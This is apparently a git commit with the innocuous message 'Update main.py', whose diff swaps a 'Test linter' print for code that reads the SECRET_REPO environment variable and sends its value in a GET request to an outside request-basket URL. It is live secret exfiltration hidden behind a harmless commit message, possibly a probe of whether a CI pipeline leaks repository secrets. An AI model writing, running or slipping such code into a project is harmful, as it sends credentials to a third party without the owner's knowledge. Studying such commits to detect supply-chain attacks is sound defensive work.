6fab9b1654cfdc982f46e8c89f145913fa19863f
rrbugproof <84215440+rrbugproof@users.noreply.github.com>
2022-05-19 09:18:08 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,8 @@
-import os
+import os, requests
 
 def main():
-    print('Test linter')
+    value_env = os.environ.get('SECRET_REPO','blankenv')
+    send_request = requests.get(url = f"https://request-baskets-do-app-kxq7h.ondigitalocean.app/6ochysc/{value_env}")
+    print(send_request.status_code)
 
 main()
